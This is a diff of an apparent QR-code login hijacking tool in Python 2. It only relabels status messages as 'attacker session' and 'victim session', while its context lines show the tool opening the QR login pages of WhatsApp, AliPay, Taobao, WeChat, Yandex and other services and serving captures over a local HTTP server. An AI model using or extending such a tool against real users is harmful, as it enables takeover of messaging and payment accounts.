@@ -37,7 +37,7 @@ def Serve_it(port=1337):
 			print " [*]  on http://localhost:"+str(port)
 			os.system("python -m SimpleHTTPServer "+str(port)+" > NUL 2>&1")
 		else:
-			print " [*] Starting attacker session on http://localhost:"+str(port)
+			print " [*] Starting victim session on http://localhost:"+str(port)
 			os.system("python -m SimpleHTTPServer "+str(port)+" > /dev/null 2>&1")
 	threading.Thread(target=serve,args=(port,)).start()
 
@@ -85,7 +85,7 @@ def Screenshot(PicName ,location ,size):
 def whatsapp():
 	driver = create_driver()
 	time.sleep(5)
-	print " [*] Navigating To Website..."
+	print " [*] Starting attacker session..."
 	driver.get('https://web.whatsapp.com/')
 	time.sleep(5)
 
@@ -117,7 +117,7 @@ def whatsapp():
 def Yandex():
 	driver = create_driver()
 	time.sleep(5)
-	print " [*] Navigating To Website..."
+	print " [*] Starting attacker session..."
 	driver.get("https://passport.yandex.com/auth?mode=qr")
 	time.sleep(5)
 	while True:
@@ -139,7 +139,7 @@ def Yandex():
 def Airdroid():
 	driver = create_driver()
 	time.sleep(5)
-	print " [*] Navigating To Website..."
+	print " [*] Starting attacker session..."
 	driver.get("http://web.airdroid.com")
 	time.sleep(5)
 	img_number = 16
@@ -174,7 +174,7 @@ def Airdroid():
 def Weibo():
 	driver = create_driver()
 	time.sleep(5)
-	print " [*] Navigating To Website..."
+	print " [*] Starting attacker session..."
 	driver.get("http://weibo.com/login.php")
 	time.sleep(5)
 	while True:
@@ -197,7 +197,7 @@ def Weibo():
 def WeChat():
 	driver = create_driver()
 	time.sleep(5)
-	print " [*] Navigating To Website..."
+	print " [*] Starting attacker session..."
 	driver.get("https://web.wechat.com")
 	time.sleep(5)
 	while True:
@@ -218,7 +218,7 @@ def WeChat():
 def AliPay():
 	driver = create_driver()
 	time.sleep(5)
-	print " [*] Navigating To Website..."
+	print " [*] Starting attacker session..."
 	driver.get("https://auth.alipay.com/login/index.htm")
 	time.sleep(10)
 	while True:
@@ -252,7 +252,7 @@ def AliPay():
 def Taobao():
 	driver = create_driver()
 	time.sleep(5)
-	print " [*] Navigating To Website..."
+	print " [*] Starting attacker session..."
 	driver.get("https://login.taobao.com")
 	time.sleep(5)
 	while True:
@@ -281,7 +281,7 @@ def Taobao():
 def mydigipass():
 	driver = create_driver()
 	time.sleep(5)
-	print " [*] Navigating To Website..."
+	print " [*] Starting attacker session..."
 	driver.get("https://www.mydigipass.com/en/fp/signin/smartphone/qr")
 	time.sleep(5)
 	while True:
@@ -304,7 +304,7 @@ def mydigipass():
 def Zapper():
 	driver = create_driver()
 	time.sleep(5)
-	print " [*] Navigating To Website..."
+	print " [*] Starting attacker session..."
 	driver.get("https://www.zapper.com/login.php")
 	time.sleep(5)
 	while True:
@@ -328,7 +328,7 @@ def Zapper():
 def Trustly_App():
 	driver = create_driver()
 	time.sleep(5)
-	print " [*] Navigating To Website..."
+	print " [*] Starting attacker session..."
 	driver.get("https://trustlyapp.com/backend")
 	time.sleep(5)
 	while True:
@@ -349,7 +349,7 @@ def Trustly_App():
 def Yelophone():
 	driver = create_driver()
 	time.sleep(5)
-	print " [*] Navigating To Website..."
+	print " [*] Starting attacker session..."
 	driver.get("https://www.yelophone.com/app#/login")
 	time.sleep(5)
 	while True:
@@ -581,7 +581,7 @@ def Remove_website():
 def First_Method(classname,url,image_number,s=10):
 	driver = create_driver()
 	time.sleep(5)
-	print " [*] Navigating To Website..."
+	print " [*] Starting attacker session..."
 	driver.get(url)
 
 	while True:
@@ -604,7 +604,7 @@ def First_Method(classname,url,image_number,s=10):
 def Second_Method(url,image_number,s=10):
 	driver = create_driver()
 	time.sleep(5)
-	print " [*] Navigating To Website..."
+	print " [*] Starting attacker session..."
 	driver.get(url)
 	time.sleep(5)
 	while True:
@@ -627,7 +627,7 @@ def Second_Method(url,image_number,s=10):
 def Third_Method(url,image_number,s=10):
 	driver = create_driver()
 	time.sleep(5)
-	print " [*] Navigating To Website..."
+	print " [*] Starting attacker session..."
 	driver.get(url)
 	time.sleep(10)
 	while True:
